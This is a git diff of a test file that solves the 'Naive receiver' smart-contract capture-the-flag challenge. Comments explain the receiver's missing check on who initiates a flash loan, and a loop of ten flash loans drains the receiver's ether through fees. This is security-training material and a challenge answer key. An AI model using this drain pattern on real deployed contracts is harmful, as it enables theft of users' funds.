@@ -37,14 +37,16 @@ describe('[Challenge] Naive receiver', function () {
     });
 
     it('Execution', async function () {
+
         // FlashLoanReceiver checks only that the call to onFlashLoan originates from the pool
         // It does not check that the flash loan was originated by itself
         // So we can create flash loans on behalf of the Receiver, and it will pay the comission every time
+
         poolPlayer = pool.connect(player);
-        for (let i = 1; i <= 10; i++) {
-            await poolPlayer.flashLoan(receiver.address, "0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE", 10n ** 18n, []);
-            expect(await ethers.provider.getBalance(receiver.address)).to.eq(ethers.utils.parseEther((10-i).toString()));
+        for (let i = 0; i < 10; i++) {
+            await poolPlayer.flashLoan(receiver.address, "0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE", ETHER_IN_RECEIVER/10n, []);
         }
+        
     });
 
     after(async function () {
